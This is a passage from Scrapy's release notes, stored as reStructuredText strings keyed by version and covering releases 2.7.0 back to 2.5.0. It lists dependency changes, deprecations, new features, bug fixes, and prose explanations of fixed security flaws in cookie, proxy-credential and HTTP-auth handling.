(:issue:`5323`,\n    :issue:`5592`, :issue:`5599`, :issue:`5691`).\n\nDocumentation\n~~~~~~~~~~~~~\n\n-   Upgraded the Code of Conduct to Contributor Covenant v2.1 (:issue:`5698`).\n\n-   Fixed typos (:issue:`5681`, :issue:`5694`).\n\nQuality assurance\n~~~~~~~~~~~~~~~~~\n\n-   Re-enabled some erroneously disabled flake8 checks (:issue:`5688`).\n\n-   Ignored harmless deprecation warnings from :mod:`typing` in tests\n    (:issue:`5686`, :issue:`5697`).\n\n-   Modernized our CI configuration (:issue:`5695`, :issue:`5696`).\n\n\n.. _release-2.7.0:\n\n", "2.7.0": "-----------------------------\n\nHighlights:\n\n-   Added Python 3.11 support, dropped Python 3.6 support\n-   Improved support for :ref:`asynchronous callbacks <topics-coroutines>`\n-   :ref:`Asyncio support <using-asyncio>` is enabled by default on new\n    projects\n-   Output names of item fields can now be arbitrary strings\n-   Centralized :ref:`request fingerprinting <request-fingerprints>`\n    configuration is now possible\n\nModified requirements\n~~~~~~~~~~~~~~~~~~~~~\n\nPython 3.7 or greater is now required; support for Python 3.6 has been dropped.\nSupport for the upcoming Python 3.11 has been added.\n\nThe minimum required version of some dependencies has changed as well:\n\n-   lxml_: 3.5.0 \u2192 4.3.0\n\n-   Pillow_ (:ref:`images pipeline <images-pipeline>`): 4.0.0 \u2192 7.1.0\n\n-   zope.interface_: 5.0.0 \u2192 5.1.0\n\n(:issue:`5512`, :issue:`5514`, :issue:`5524`, :issue:`5563`, :issue:`5664`,\n:issue:`5670`, :issue:`5678`)\n\n\nDeprecations\n~~~~~~~~~~~~\n\n-   :meth:`ImagesPipeline.thumb_path\n    <scrapy.pipelines.images.ImagesPipeline.thumb_path>` must now accept an\n    ``item`` parameter (:issue:`5504`, :issue:`5508`).\n\n-   The ``scrapy.downloadermiddlewares.decompression`` module is now\n    deprecated (:issue:`5546`, :issue:`5547`).\n\n\nNew features\n~~~~~~~~~~~~\n\n-   The\n    :meth:`~scrapy.spidermiddlewares.SpiderMiddleware.process_spider_output`\n    method of :ref:`spider middlewares <topics-spider-middleware>` can now be\n    defined as an :term:`asynchronous generator` (:issue:`4978`).\n\n-   The output of :class:`~scrapy.Request` callbacks defined as\n    :ref:`coroutines <topics-coroutines>` is now processed asynchronously\n    (:issue:`4978`).\n\n-   :class:`~scrapy.spiders.crawl.CrawlSpider` now supports :ref:`asynchronous\n    callbacks <topics-coroutines>` (:issue:`5657`).\n\n-   New projects created with the :command:`startproject` command have\n    :ref:`asyncio support <using-asyncio>` enabled by default (:issue:`5590`,\n    :issue:`5679`).\n\n-   The :setting:`FEED_EXPORT_FIELDS` setting can now be defined as a\n    dictionary to customize the output name of item fields, lifting the\n    restriction that required output names to be valid Python identifiers, e.g.\n    preventing them to have whitespace (:issue:`1008`, :issue:`3266`,\n    :issue:`3696`).\n\n-   You can now customize :ref:`request fingerprinting <request-fingerprints>`\n    through the new :setting:`REQUEST_FINGERPRINTER_CLASS` setting, instead of\n    having to change it on every Scrapy component that relies on request\n    fingerprinting (:issue:`900`, :issue:`3420`, :issue:`4113`, :issue:`4762`,\n    :issue:`4524`).\n\n-   ``jsonl`` is now supported and encouraged as a file extension for `JSON\n    Lines`_ files (:issue:`4848`).\n\n    .. _JSON Lines: https://jsonlines.org/\n\n-   :meth:`ImagesPipeline.thumb_path\n    <scrapy.pipelines.images.ImagesPipeline.thumb_path>` now receives the\n    source :ref:`item <topics-items>` (:issue:`5504`, :issue:`5508`).\n\n\nBug fixes\n~~~~~~~~~\n\n-   When using Google Cloud Storage with a :ref:`media pipeline\n    <topics-media-pipeline>`, :setting:`FILES_EXPIRES` now also works when\n    :setting:`FILES_STORE` does not point at the root of your Google Cloud\n    Storage bucket (:issue:`5317`, :issue:`5318`).\n\n-   The :command:`parse` command now supports :ref:`asynchronous callbacks\n    <topics-coroutines>` (:issue:`5424`, :issue:`5577`).\n\n-   When using the :command:`parse` command with a URL for which there is no\n    available spider, an exception is no longer raised (:issue:`3264`,\n    :issue:`3265`, :issue:`5375`, :issue:`5376`, :issue:`5497`).\n\n-   :class:`~scrapy.http.TextResponse` now gives higher priority to the `byte\n    order mark`_ when determining the text encoding of the response body,\n    following the `HTML living standard`_ (:issue:`5601`, :issue:`5611`).\n\n    .. _byte order mark: https://en.wikipedia.org/wiki/Byte_order_mark\n    .. _HTML living standard: https://html.spec.whatwg.org/multipage/parsing.html#determining-the-character-encoding\n\n-   MIME sniffing takes the response body into account in FTP and HTTP/1.0\n    requests, as well as in cached requests (:issue:`4873`).\n\n-   MIME sniffing now detects valid HTML 5 documents even if the ``html`` tag\n    is missing (:issue:`4873`).\n\n-   An exception is now raised if :setting:`ASYNCIO_EVENT_LOOP` has a value\n    that does not match the asyncio event loop actually installed\n    (:issue:`5529`).\n\n-   Fixed :meth:`Headers.getlist <scrapy.http.headers.Headers.getlist>`\n    returning only the last header (:issue:`5515`, :issue:`5526`).\n\n-   Fixed :class:`LinkExtractor\n    <scrapy.linkextractors.lxmlhtml.LxmlLinkExtractor>` not ignoring the\n    ``tar.gz`` file extension by default (:issue:`1837`, :issue:`2067`,\n    :issue:`4066`)\n\n\nDocumentation\n~~~~~~~~~~~~~\n\n-   Clarified the return type of :meth:`Spider.parse <scrapy.Spider.parse>`\n    (:issue:`5602`, :issue:`5608`).\n\n-   To enable\n    :class:`~scrapy.downloadermiddlewares.httpcompression.HttpCompressionMiddleware`\n    to do `brotli compression`_, installing brotli_ is now recommended instead\n    of installing brotlipy_, as the former provides a more recent version of\n    brotli.\n\n    .. _brotli: https://github.com/google/brotli\n    .. _brotli compression: https://www.ietf.org/rfc/rfc7932.txt\n\n-   :ref:`Signal documentation <topics-signals>` now mentions :ref:`coroutine\n    support <topics-coroutines>` and uses it in code examples (:issue:`4852`,\n    :issue:`5358`).\n\n-   :ref:`bans` now recommends `Common Crawl`_ instead of `Google cache`_\n    (:issue:`3582`, :issue:`5432`).\n\n    .. _Common Crawl: https://commoncrawl.org/\n    .. _Google cache: http://www.googleguide.com/cached_pages.html\n\n-   The new :ref:`topics-components` topic covers enforcing requirements on\n    Scrapy components, like :ref:`downloader middlewares\n    <topics-downloader-middleware>`, :ref:`extensions <topics-extensions>`,\n    :ref:`item pipelines <topics-item-pipeline>`, :ref:`spider middlewares\n    <topics-spider-middleware>`, and more; :ref:`enforce-asyncio-requirement`\n    has also been added (:issue:`4978`).\n\n-   :ref:`topics-settings` now indicates that setting values must be\n    :ref:`picklable <pickle-picklable>` (:issue:`5607`, :issue:`5629`).\n\n-   Removed outdated documentation (:issue:`5446`, :issue:`5373`,\n    :issue:`5369`, :issue:`5370`, :issue:`5554`).\n\n-   Fixed typos (:issue:`5442`, :issue:`5455`, :issue:`5457`, :issue:`5461`,\n    :issue:`5538`, :issue:`5553`, :issue:`5558`, :issue:`5624`, :issue:`5631`).\n\n-   Fixed other issues (:issue:`5283`, :issue:`5284`, :issue:`5559`,\n    :issue:`5567`, :issue:`5648`, :issue:`5659`, :issue:`5665`).\n\n\nQuality assurance\n~~~~~~~~~~~~~~~~~\n\n-   Added a continuous integration job to run `twine check`_ (:issue:`5655`,\n    :issue:`5656`).\n\n    .. _twine check: https://twine.readthedocs.io/en/stable/#twine-check\n\n-   Addressed test issues and warnings (:issue:`5560`, :issue:`5561`,\n    :issue:`5612`, :issue:`5617`, :issue:`5639`, :issue:`5645`, :issue:`5662`,\n    :issue:`5671`, :issue:`5675`).\n\n-   Cleaned up code (:issue:`4991`, :issue:`4995`, :issue:`5451`,\n    :issue:`5487`, :issue:`5542`, :issue:`5667`, :issue:`5668`, :issue:`5672`).\n\n-   Applied minor code improvements (:issue:`5661`).\n\n\n.. _release-2.6.3:\n\n", "2.6.3": "-------------------------\n\n-   Added support for pyOpenSSL_ 22.1.0, removing support for SSLv3\n    (:issue:`5634`, :issue:`5635`, :issue:`5636`).\n\n-   Upgraded the minimum versions of the following dependencies:\n\n    -   cryptography_: 2.0 \u2192 3.3\n\n    -   pyOpenSSL_: 16.2.0 \u2192 21.0.0\n\n    -   service_identity_: 16.0.0 \u2192 18.1.0\n\n    -   Twisted_: 17.9.0 \u2192 18.9.0\n\n    -   zope.interface_: 4.1.3 \u2192 5.0.0\n\n    (:issue:`5621`, :issue:`5632`)\n\n-   Fixes test and documentation issues (:issue:`5612`, :issue:`5617`,\n    :issue:`5631`).\n\n\n.. _release-2.6.2:\n\n", "2.6.2": "-------------------------\n\n**Security bug fix:**\n\n-   When :class:`~scrapy.downloadermiddlewares.httpproxy.HttpProxyMiddleware`\n    processes a request with :reqmeta:`proxy` metadata, and that\n    :reqmeta:`proxy` metadata includes proxy credentials,\n    :class:`~scrapy.downloadermiddlewares.httpproxy.HttpProxyMiddleware` sets\n    the ``Proxy-Authorization`` header, but only if that header is not already\n    set.\n\n    There are third-party proxy-rotation downloader middlewares that set\n    different :reqmeta:`proxy` metadata every time they process a request.\n\n    Because of request retries and redirects, the same request can be processed\n    by downloader middlewares more than once, including both\n    :class:`~scrapy.downloadermiddlewares.httpproxy.HttpProxyMiddleware` and\n    any third-party proxy-rotation downloader middleware.\n\n    These third-party proxy-rotation downloader middlewares could change the\n    :reqmeta:`proxy` metadata of a request to a new value, but fail to remove\n    the ``Proxy-Authorization`` header from the previous value of the\n    :reqmeta:`proxy` metadata, causing the credentials of one proxy to be sent\n    to a different proxy.\n\n    To prevent the unintended leaking of proxy credentials, the behavior of\n    :class:`~scrapy.downloadermiddlewares.httpproxy.HttpProxyMiddleware` is now\n    as follows when processing a request:\n\n    -   If the request being processed defines :reqmeta:`proxy` metadata that\n        includes credentials, the ``Proxy-Authorization`` header is always\n        updated to feature those credentials.\n\n    -   If the request being processed defines :reqmeta:`proxy` metadata\n        without credentials, the ``Proxy-Authorization`` header is removed\n        *unless* it was originally defined for the same proxy URL.\n\n        To remove proxy credentials while keeping the same proxy URL, remove\n        the ``Proxy-Authorization`` header.\n\n    -   If the request has no :reqmeta:`proxy` metadata, or that metadata is a\n        falsy value (e.g. ``None``), the ``Proxy-Authorization`` header is\n        removed.\n\n        It is no longer possible to set a proxy URL through the\n        :reqmeta:`proxy` metadata but set the credentials through the\n        ``Proxy-Authorization`` header. Set proxy credentials through the\n        :reqmeta:`proxy` metadata instead.\n\nAlso fixes the following regressions introduced in 2.6.0:\n\n-   :class:`~scrapy.crawler.CrawlerProcess` supports again crawling multiple\n    spiders (:issue:`5435`, :issue:`5436`)\n\n-   Installing a Twisted reactor before Scrapy does (e.g. importing\n    :mod:`twisted.internet.reactor` somewhere at the module level) no longer\n    prevents Scrapy from starting, as long as a different reactor is not\n    specified in :setting:`TWISTED_REACTOR` (:issue:`5525`, :issue:`5528`)\n\n-   Fixed an exception that was being logged after the spider finished under\n    certain conditions (:issue:`5437`, :issue:`5440`)\n\n-   The ``--output``/``-o`` command-line parameter supports again a value\n    starting with a hyphen (:issue:`5444`, :issue:`5445`)\n\n-   The ``scrapy parse -h`` command no longer throws an error (:issue:`5481`,\n    :issue:`5482`)\n\n\n.. _release-2.6.1:\n\n", "2.6.1": "-------------------------\n\nFixes a regression introduced in 2.6.0 that would unset the request method when\nfollowing redirects.\n\n\n.. _release-2.6.0:\n\n", "2.6.0": "-------------------------\n\nHighlights:\n\n*   :ref:`Security fixes for cookie handling <2.6-security-fixes>`\n\n*   Python 3.10 support\n\n*   :ref:`asyncio support <using-asyncio>` is no longer considered\n    experimental, and works out-of-the-box on Windows regardless of your Python\n    version\n\n*   Feed exports now support :class:`pathlib.Path` output paths and per-feed\n    :ref:`item filtering <item-filter>` and\n    :ref:`post-processing <post-processing>`\n\n.. _2.6-security-fixes:\n\nSecurity bug fixes\n~~~~~~~~~~~~~~~~~~\n\n-   When a :class:`~scrapy.http.Request` object with cookies defined gets a\n    redirect response causing a new :class:`~scrapy.http.Request` object to be\n    scheduled, the cookies defined in the original\n    :class:`~scrapy.http.Request` object are no longer copied into the new\n    :class:`~scrapy.http.Request` object.\n\n    If you manually set the ``Cookie`` header on a\n    :class:`~scrapy.http.Request` object and the domain name of the redirect\n    URL is not an exact match for the domain of the URL of the original\n    :class:`~scrapy.http.Request` object, your ``Cookie`` header is now dropped\n    from the new :class:`~scrapy.http.Request` object.\n\n    The old behavior could be exploited by an attacker to gain access to your\n    cookies. Please, see the `cjvr-mfj7-j4j8 security advisory`_ for more\n    information.\n\n    .. _cjvr-mfj7-j4j8 security advisory: https://github.com/scrapy/scrapy/security/advisories/GHSA-cjvr-mfj7-j4j8\n\n    .. note:: It is still possible to enable the sharing of cookies between\n              different domains with a shared domain suffix (e.g.\n              ``example.com`` and any subdomain) by defining the shared domain\n              suffix (e.g. ``example.com``) as the cookie domain when defining\n              your cookies. See the documentation of the\n              :class:`~scrapy.http.Request` class for more information.\n\n-   When the domain of a cookie, either received in the ``Set-Cookie`` header\n    of a response or defined in a :class:`~scrapy.http.Request` object, is set\n    to a `public suffix <https://publicsuffix.org/>`_, the cookie is now\n    ignored unless the cookie domain is the same as the request domain.\n\n    The old behavior could be exploited by an attacker to inject cookies from a\n    controlled domain into your cookiejar that could be sent to other domains\n    not controlled by the attacker. Please, see the `mfjm-vh54-3f96 security\n    advisory`_ for more information.\n\n    .. _mfjm-vh54-3f96 security advisory: https://github.com/scrapy/scrapy/security/advisories/GHSA-mfjm-vh54-3f96\n\n\nModified requirements\n~~~~~~~~~~~~~~~~~~~~~\n\n-   The h2_ dependency is now optional, only needed to\n    :ref:`enable HTTP/2 support <http2>`. (:issue:`5113`)\n\n    .. _h2: https://pypi.org/project/h2/\n\n\nBackward-incompatible changes\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n-   The ``formdata`` parameter of :class:`~scrapy.FormRequest`, if specified\n    for a non-POST request, now overrides the URL query string, instead of\n    being appended to it. (:issue:`2919`, :issue:`3579`)\n\n-   When a function is assigned to the :setting:`FEED_URI_PARAMS` setting, now\n    the return value of that function, and not the ``params`` input parameter,\n    will determine the feed URI parameters, unless that return value is\n    ``None``. (:issue:`4962`, :issue:`4966`)\n\n-   In :class:`scrapy.core.engine.ExecutionEngine`, methods\n    :meth:`~scrapy.core.engine.ExecutionEngine.crawl`,\n    :meth:`~scrapy.core.engine.ExecutionEngine.download`,\n    :meth:`~scrapy.core.engine.ExecutionEngine.schedule`,\n    and :meth:`~scrapy.core.engine.ExecutionEngine.spider_is_idle`\n    now raise :exc:`RuntimeError` if called before\n    :meth:`~scrapy.core.engine.ExecutionEngine.open_spider`. (:issue:`5090`)\n\n    These methods used to assume that\n    :attr:`ExecutionEngine.slot <scrapy.core.engine.ExecutionEngine.slot>` had\n    been defined by a prior call to\n    :meth:`~scrapy.core.engine.ExecutionEngine.open_spider`, so they were\n    raising :exc:`AttributeError` instead.\n\n-   If the API of the configured :ref:`scheduler <topics-scheduler>` does not\n    meet expectations, :exc:`TypeError` is now raised at startup time. Before,\n    other exceptions would be raised at run time. (:issue:`3559`)\n\n-   The ``_encoding`` field of serialized :class:`~scrapy.http.Request` objects\n    is now named ``encoding``, in line with all other fields (:issue:`5130`)\n\n\nDeprecation removals\n~~~~~~~~~~~~~~~~~~~~\n\n-   ``scrapy.http.TextResponse.body_as_unicode``, deprecated in Scrapy 2.2, has\n    now been removed. (:issue:`5393`)\n\n-   ``scrapy.item.BaseItem``, deprecated in Scrapy 2.2, has now been removed.\n    (:issue:`5398`)\n\n-   ``scrapy.item.DictItem``, deprecated in Scrapy 1.8, has now been removed.\n    (:issue:`5398`)\n\n-   ``scrapy.Spider.make_requests_from_url``, deprecated in Scrapy 1.4, has now\n    been removed. (:issue:`4178`, :issue:`4356`)\n\n\nDeprecations\n~~~~~~~~~~~~\n\n-   When a function is assigned to the :setting:`FEED_URI_PARAMS` setting,\n    returning ``None`` or modifying the ``params`` input parameter is now\n    deprecated. Return a new dictionary instead. (:issue:`4962`, :issue:`4966`)\n\n-   :mod:`scrapy.utils.reqser` is deprecated. (:issue:`5130`)\n\n    -   Instead of :func:`~scrapy.utils.reqser.request_to_dict`, use the new\n        :meth:`Request.to_dict <scrapy.http.Request.to_dict>` method.\n\n    -   Instead of :func:`~scrapy.utils.reqser.request_from_dict`, use the new\n        :func:`scrapy.utils.request.request_from_dict` function.\n\n-   In :mod:`scrapy.squeues`, the following queue classes are deprecated:\n    :class:`~scrapy.squeues.PickleFifoDiskQueueNonRequest`,\n    :class:`~scrapy.squeues.PickleLifoDiskQueueNonRequest`,\n    :class:`~scrapy.squeues.MarshalFifoDiskQueueNonRequest`,\n    and :class:`~scrapy.squeues.MarshalLifoDiskQueueNonRequest`. You should\n    instead use:\n    :class:`~scrapy.squeues.PickleFifoDiskQueue`,\n    :class:`~scrapy.squeues.PickleLifoDiskQueue`,\n    :class:`~scrapy.squeues.MarshalFifoDiskQueue`,\n    and :class:`~scrapy.squeues.MarshalLifoDiskQueue`. (:issue:`5117`)\n\n-   Many aspects of :class:`scrapy.core.engine.ExecutionEngine` that come from\n    a time when this class could handle multiple :class:`~scrapy.Spider`\n    objects at a time have been deprecated. (:issue:`5090`)\n\n    -   The :meth:`~scrapy.core.engine.ExecutionEngine.has_capacity` method\n        is deprecated.\n\n    -   The :meth:`~scrapy.core.engine.ExecutionEngine.schedule` method is\n        deprecated, use :meth:`~scrapy.core.engine.ExecutionEngine.crawl` or\n        :meth:`~scrapy.core.engine.ExecutionEngine.download` instead.\n\n    -   The :attr:`~scrapy.core.engine.ExecutionEngine.open_spiders` attribute\n        is deprecated, use :attr:`~scrapy.core.engine.ExecutionEngine.spider`\n        instead.\n\n    -   The ``spider`` parameter is deprecated for the following methods:\n\n        -   :meth:`~scrapy.core.engine.ExecutionEngine.spider_is_idle`\n\n        -   :meth:`~scrapy.core.engine.ExecutionEngine.crawl`\n\n        -   :meth:`~scrapy.core.engine.ExecutionEngine.download`\n\n        Instead, call :meth:`~scrapy.core.engine.ExecutionEngine.open_spider`\n        first to set the :class:`~scrapy.Spider` object.\n\n-   :func:`scrapy.utils.response.response_httprepr` is now deprecated.\n    (:issue:`4972`)\n\n\nNew features\n~~~~~~~~~~~~\n\n-   You can now use :ref:`item filtering <item-filter>` to control which items\n    are exported to each output feed. (:issue:`4575`, :issue:`5178`,\n    :issue:`5161`, :issue:`5203`)\n\n-   You can now apply :ref:`post-processing <post-processing>` to feeds, and\n    :ref:`built-in post-processing plugins <builtin-plugins>` are provided for\n    output file compression. (:issue:`2174`, :issue:`5168`, :issue:`5190`)\n\n-   The :setting:`FEEDS` setting now supports :class:`pathlib.Path` objects as\n    keys. (:issue:`5383`, :issue:`5384`)\n\n-   Enabling :ref:`asyncio <using-asyncio>` while using Windows and Python 3.8\n    or later will automatically switch the asyncio event loop to one that\n    allows Scrapy to work. See :ref:`asyncio-windows`. (:issue:`4976`,\n    :issue:`5315`)\n\n-   The :command:`genspider` command now supports a start URL instead of a\n    domain name. (:issue:`4439`)\n\n-   :mod:`scrapy.utils.defer` gained 2 new functions,\n    :func:`~scrapy.utils.defer.deferred_to_future` and\n    :func:`~scrapy.utils.defer.maybe_deferred_to_future`, to help :ref:`await\n    on Deferreds when using the asyncio reactor <asyncio-await-dfd>`.\n    (:issue:`5288`)\n\n-   :ref:`Amazon S3 feed export storage <topics-feed-storage-s3>` gained\n    support for `temporary security credentials`_\n    (:setting:`AWS_SESSION_TOKEN`) and endpoint customization\n    (:setting:`AWS_ENDPOINT_URL`). (:issue:`4998`, :issue:`5210`)\n\n    .. _temporary security credentials: https://docs.aws.amazon.com/general/latest/gr/aws-sec-cred-types.html#temporary-access-keys\n\n-   New :setting:`LOG_FILE_APPEND` setting to allow truncating the log file.\n    (:issue:`5279`)\n\n-   :attr:`Request.cookies <scrapy.Request.cookies>` values that are\n    :class:`bool`, :class:`float` or :class:`int` are cast to :class:`str`.\n    (:issue:`5252`, :issue:`5253`)\n\n-   You may now raise :exc:`~scrapy.exceptions.CloseSpider` from a handler of\n    the :signal:`spider_idle` signal to customize the reason why the spider is\n    stopping. (:issue:`5191`)\n\n-   When using\n    :class:`~scrapy.downloadermiddlewares.httpproxy.HttpProxyMiddleware`, the\n    proxy URL for non-HTTPS HTTP/1.1 requests no longer needs to include a URL\n    scheme. (:issue:`4505`, :issue:`4649`)\n\n-   All built-in queues now expose a ``peek`` method that returns the next\n    queue object (like ``pop``) but does not remove the returned object from\n    the queue. (:issue:`5112`)\n\n    If the underlying queue does not support peeking (e.g. because you are not\n    using ``queuelib`` 1.6.1 or later), the ``peek`` method raises\n    :exc:`NotImplementedError`.\n\n-   :class:`~scrapy.http.Request` and :class:`~scrapy.http.Response` now have\n    an ``attributes`` attribute that makes subclassing easier. For\n    :class:`~scrapy.http.Request`, it also allows subclasses to work with\n    :func:`scrapy.utils.request.request_from_dict`. (:issue:`1877`,\n    :issue:`5130`, :issue:`5218`)\n\n-   The :meth:`~scrapy.core.scheduler.BaseScheduler.open` and\n    :meth:`~scrapy.core.scheduler.BaseScheduler.close` methods of the\n    :ref:`scheduler <topics-scheduler>` are now optional. (:issue:`3559`)\n\n-   HTTP/1.1 :exc:`~scrapy.core.downloader.handlers.http11.TunnelError`\n    exceptions now only truncate response bodies longer than 1000 characters,\n    instead of those longer than 32 characters, making it easier to debug such\n    errors. (:issue:`4881`, :issue:`5007`)\n\n-   :class:`~scrapy.loader.ItemLoader` now supports non-text responses.\n    (:issue:`5145`, :issue:`5269`)\n\n\nBug fixes\n~~~~~~~~~\n\n-   The :setting:`TWISTED_REACTOR` and :setting:`ASYNCIO_EVENT_LOOP` settings\n    are no longer ignored if defined in :attr:`~scrapy.Spider.custom_settings`.\n    (:issue:`4485`, :issue:`5352`)\n\n-   Removed a module-level Twisted reactor import that could prevent\n    :ref:`using the asyncio reactor <using-asyncio>`. (:issue:`5357`)\n\n-   The :command:`startproject` command works with existing folders again.\n    (:issue:`4665`, :issue:`4676`)\n\n-   The :setting:`FEED_URI_PARAMS` setting now behaves as documented.\n    (:issue:`4962`, :issue:`4966`)\n\n-   :attr:`Request.cb_kwargs <scrapy.Request.cb_kwargs>` once again allows the\n    ``callback`` keyword. (:issue:`5237`, :issue:`5251`, :issue:`5264`)\n\n-   Made :func:`scrapy.utils.response.open_in_browser` support more complex\n    HTML. (:issue:`5319`, :issue:`5320`)\n\n-   Fixed :attr:`CSVFeedSpider.quotechar\n    <scrapy.spiders.CSVFeedSpider.quotechar>` being interpreted as the CSV file\n    encoding. (:issue:`5391`, :issue:`5394`)\n\n-   Added missing setuptools_ to the list of dependencies. (:issue:`5122`)\n\n    .. _setuptools: https://pypi.org/project/setuptools/\n\n-   :class:`LinkExtractor <scrapy.linkextractors.lxmlhtml.LxmlLinkExtractor>`\n    now also works as expected with links that have comma-separated ``rel``\n    attribute values including ``nofollow``. (:issue:`5225`)\n\n-   Fixed a :exc:`TypeError` that could be raised during :ref:`feed export\n    <topics-feed-exports>` parameter parsing. (:issue:`5359`)\n\n\nDocumentation\n~~~~~~~~~~~~~\n\n-   :ref:`asyncio support <using-asyncio>` is no longer considered\n    experimental. (:issue:`5332`)\n\n-   Included :ref:`Windows-specific help for asyncio usage <asyncio-windows>`.\n    (:issue:`4976`, :issue:`5315`)\n\n-   Rewrote :ref:`topics-headless-browsing` with up-to-date best practices.\n    (:issue:`4484`, :issue:`4613`)\n\n-   Documented :ref:`local file naming in media pipelines\n    <topics-file-naming>`. (:issue:`5069`, :issue:`5152`)\n\n-   :ref:`faq` now covers spider file name collision issues. (:issue:`2680`,\n    :issue:`3669`)\n\n-   Provided better context and instructions to disable the\n    :setting:`URLLENGTH_LIMIT` setting. (:issue:`5135`, :issue:`5250`)\n\n-   Documented that :ref:`reppy-parser` does not support Python 3.9+.\n    (:issue:`5226`, :issue:`5231`)\n\n-   Documented :ref:`the scheduler component <topics-scheduler>`.\n    (:issue:`3537`, :issue:`3559`)\n\n-   Documented the method used by :ref:`media pipelines\n    <topics-media-pipeline>` to :ref:`determine if a file has expired\n    <file-expiration>`. (:issue:`5120`, :issue:`5254`)\n\n-   :ref:`run-multiple-spiders` now features\n    :func:`scrapy.utils.project.get_project_settings` usage. (:issue:`5070`)\n\n-   :ref:`run-multiple-spiders` now covers what happens when you define\n    different per-spider values for some settings that cannot differ at run\n    time. (:issue:`4485`, :issue:`5352`)\n\n-   Extended the documentation of the\n    :class:`~scrapy.extensions.statsmailer.StatsMailer` extension.\n    (:issue:`5199`, :issue:`5217`)\n\n-   Added :setting:`JOBDIR` to :ref:`topics-settings`. (:issue:`5173`,\n    :issue:`5224`)\n\n-   Documented :attr:`Spider.attribute <scrapy.Spider.attribute>`.\n    (:issue:`5174`, :issue:`5244`)\n\n-   Documented :attr:`TextResponse.urljoin <scrapy.http.TextResponse.urljoin>`.\n    (:issue:`1582`)\n\n-   Added the ``body_length`` parameter to the documented signature of the\n    :signal:`headers_received` signal. (:issue:`5270`)\n\n-   Clarified :meth:`SelectorList.get <scrapy.selector.SelectorList.get>` usage\n    in the :ref:`tutorial <intro-tutorial>`. (:issue:`5256`)\n\n-   The documentation now features the shortest import path of classes with\n    multiple import paths. (:issue:`2733`, :issue:`5099`)\n\n-   ``quotes.toscrape.com`` references now use HTTPS instead of HTTP.\n    (:issue:`5395`, :issue:`5396`)\n\n-   Added a link to `our Discord server <https://discord.gg/mv3yErfpvq>`_\n    to :ref:`getting-help`. (:issue:`5421`, :issue:`5422`)\n\n-   The pronunciation of the project name is now :ref:`officially\n    <intro-overview>` /\u02c8skre\u026apa\u026a/. (:issue:`5280`, :issue:`5281`)\n\n-   Added the Scrapy logo to the README. (:issue:`5255`, :issue:`5258`)\n\n-   Fixed issues and implemented minor improvements. (:issue:`3155`,\n    :issue:`4335`, :issue:`5074`, :issue:`5098`, :issue:`5134`, :issue:`5180`,\n    :issue:`5194`, :issue:`5239`, :issue:`5266`, :issue:`5271`, :issue:`5273`,\n    :issue:`5274`, :issue:`5276`, :issue:`5347`, :issue:`5356`, :issue:`5414`,\n    :issue:`5415`, :issue:`5416`, :issue:`5419`, :issue:`5420`)\n\n\nQuality Assurance\n~~~~~~~~~~~~~~~~~\n\n-   Added support for Python 3.10. (:issue:`5212`, :issue:`5221`,\n    :issue:`5265`)\n\n-   Significantly reduced memory usage by\n    :func:`scrapy.utils.response.response_httprepr`, used by the\n    :class:`~scrapy.downloadermiddlewares.stats.DownloaderStats` downloader\n    middleware, which is enabled by default. (:issue:`4964`, :issue:`4972`)\n\n-   Removed uses of the deprecated :mod:`optparse` module. (:issue:`5366`,\n    :issue:`5374`)\n\n-   Extended typing hints. (:issue:`5077`, :issue:`5090`, :issue:`5100`,\n    :issue:`5108`, :issue:`5171`, :issue:`5215`, :issue:`5334`)\n\n-   Improved tests, fixed CI issues, removed unused code. (:issue:`5094`,\n    :issue:`5157`, :issue:`5162`, :issue:`5198`, :issue:`5207`, :issue:`5208`,\n    :issue:`5229`, :issue:`5298`, :issue:`5299`, :issue:`5310`, :issue:`5316`,\n    :issue:`5333`, :issue:`5388`, :issue:`5389`, :issue:`5400`, :issue:`5401`,\n    :issue:`5404`, :issue:`5405`, :issue:`5407`, :issue:`5410`, :issue:`5412`,\n    :issue:`5425`, :issue:`5427`)\n\n-   Implemented improvements for contributors. (:issue:`5080`, :issue:`5082`,\n    :issue:`5177`, :issue:`5200`)\n\n-   Implemented cleanups. (:issue:`5095`, :issue:`5106`, :issue:`5209`,\n    :issue:`5228`, :issue:`5235`, :issue:`5245`, :issue:`5246`, :issue:`5292`,\n    :issue:`5314`, :issue:`5322`)\n\n\n.. _release-2.5.1:\n\n", "2.5.1": "-------------------------\n\n*   **Security bug fix:**\n\n    If you use\n    :class:`~scrapy.downloadermiddlewares.httpauth.HttpAuthMiddleware`\n    (i.e. the ``http_user`` and ``http_pass`` spider attributes) for HTTP\n    authentication, any request exposes your credentials to the request target.\n\n    To prevent unintended exposure of authentication credentials to unintended\n    domains, you must now additionally set a new, additional spider attribute,\n    ``http_auth_domain``, and point it to the specific domain to which the\n    authentication credentials must be sent.\n\n    If the ``http_auth_domain`` spider attribute is not set, the domain of the\n    first request will be considered the HTTP authentication target, and\n    authentication credentials will only be sent in requests targeting that\n    domain.\n\n    If you need to send the same HTTP authentication credentials to multiple\n    domains, you can use :func:`w3lib.http.basic_auth_header` instead to\n    set the value of the ``Authorization`` header of your requests.\n\n    If you *really* want your spider to send the same HTTP authentication\n    credentials to any domain, set the ``http_auth_domain`` spider attribute\n    to ``None``.\n\n    Finally, if you are a user of `scrapy-splash`_, know that this version of\n    Scrapy breaks compatibility with scrapy-splash 0.7.2 and earlier. You will\n    need to upgrade scrapy-splash to a greater version for it to continue to\n    work.\n\n.. _scrapy-splash: https://github.com/scrapy-plugins/scrapy-splash\n\n\n.. _release-2.5.0:\n\n", "2.5.0": "-------------------------\n\nHighlights:\n\n-   Official Python 3.9 support\n\n-   Experimental :ref:`HTTP/2 support <http2>`\n\n-   New :func:`~scrapy.downloadermiddlewares.retry.get_retry_request` function\n    to retry requests from spider callbacks\n\n-   New :class:`~scrapy.signals.headers_received` signal that allows stopping\n    downloads early\n\n-   New :class:`Response.protocol <scrapy.http.Response.protocol>` attribute\n\nDeprecation removals\n~~~~~~~~~~~~~~~~~~~~\n\n-   Removed all code that :ref:`was deprecated in 1.7.0 <1.7-deprecations>` and\n    had not :ref:`already been removed in 2.4.0 <2.4-deprecation-removals>`.\n    (:issue:`4901`)\n\n-   Removed support for the ``SCRAPY_PICKLED_SETTINGS_TO_OVERRIDE`` environment\n    variable, :ref:`deprecated in 1.8.0 <1.8-deprecations>`. (:issue:`4912`)\n\n\nDeprecations\n~~~~~~~~~~~~\n\n-   The :mod:`scrapy.utils.py36` module is now deprecated in favor of\n    :mod:`scrapy.utils.asyncgen`. (:issue:`4900`)\n\n\nNew features\n~~~~~~~~~~~~\n\n-   Experimental 